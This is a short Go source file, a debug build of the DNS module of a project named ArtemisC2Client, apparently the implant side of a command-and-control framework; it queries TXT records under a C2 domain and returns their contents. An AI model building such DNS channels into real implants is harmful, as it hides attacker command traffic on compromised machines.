//go:build debug

package dns

import (
	"fmt"
	"github.com/desertcod98/ArtemisC2Client/log"

	"github.com/miekg/dns"
)

var (
	client     = dns.Client{}
	dnsServer  = "127.0.0.1:53"
	DomainName = ".artemis.com."
)

// Library is used because with go standard implementation you can not specify the dns server IP. 
// In the release build the system DNS resolver is used.
func DnsQuery(subdomain string) (string, error) {
	m := dns.Msg{}
	query := subdomain + DomainName
	m.SetQuestion(query, dns.TypeTXT)

	r, _, err := client.Exchange(&m, dnsServer)
	if err != nil {
		log.Log(err.Error())
		return "", err
	}

	for _, ans := range r.Answer {
		t, ok := ans.(*dns.TXT)
		if ok && len(t.Txt) > 0 {
			return t.Txt[0], nil
		}
	}
	return "", fmt.Errorf("no TXT record found for %s", query)
}
